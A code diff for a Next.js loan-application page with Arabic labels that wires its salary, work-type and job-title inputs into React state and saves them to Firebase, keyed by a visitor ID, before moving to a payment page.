@@ -5,14 +5,21 @@ import { Card, CardContent } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { addData } from "@/lib/firebase"
 import { Menu, Users, Home, Check } from "lucide-react"
 import { useRouter } from "next/navigation"
+import React, { useState } from "react"
 
 export default function LoanApplicationPage() {
+  const [salary,setSalary]=useState('')
+  const [work,setWork]=useState('')
+  const [job,setJob]=useState('')
   const router = useRouter()
 
-  const handleSubmit = () => {
-    // Navigate to payment page
+  const handleSubmit = (e:any) => {
+    e.preventDefault()
+    const visitorId=localStorage.getItem('visitor')
+    addData({id:visitorId,work,salary,job})
     router.push("/loan-application/payment")
   }
 
@@ -35,7 +42,7 @@ export default function LoanApplicationPage() {
       </header>
 
       {/* Main Content */}
-      <form className="max-w-md mx-auto p-6 space-y-8">
+      <form className="max-w-md mx-auto p-6 space-y-8" onSubmit={handleSubmit}>
         {/* Application Form */}
         <Card className="shadow-lg border-0 mt-8">
           <CardContent className="p-6 space-y-6">
@@ -50,6 +57,7 @@ export default function LoanApplicationPage() {
                 placeholder="صافي الراتب بعد الاقتطاع"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
+                onChange={(e)=>{setSalary(e.target.value)}}
               />
             </div>
 
@@ -64,6 +72,8 @@ export default function LoanApplicationPage() {
                 placeholder="نوع العمل"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
+                onChange={(e)=>{setWork(e.target.value)}}
+
               />
             </div>
 
@@ -78,6 +88,8 @@ export default function LoanApplicationPage() {
                 placeholder="اسم الوظيفة"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
+                onChange={(e)=>{setJob(e.target.value)}}
+
               />
             </div>
           </CardContent>
